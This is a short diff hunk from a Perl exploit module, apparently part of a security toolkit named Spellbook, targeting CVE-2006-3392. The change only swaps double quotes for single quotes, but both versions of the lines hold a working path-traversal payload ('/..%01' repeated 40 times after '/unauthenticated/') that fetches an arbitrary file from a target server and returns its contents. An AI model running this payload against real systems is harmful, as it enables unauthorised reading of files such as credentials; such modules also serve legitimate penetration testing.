@@ -22,8 +22,8 @@ package Spellbook::Advisory::CVE_2006_3392 {
             }
             
             my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $temp      = "/..%01" x 40;
-            my $request   = $userAgent -> get($target . "/unauthenticated/" . $temp . $file);
+            my $temp      = '/..%01' x 40;
+            my $request   = $userAgent -> get($target . '/unauthenticated/' . $temp . $file);
             
             return $request -> content(); 
         } 
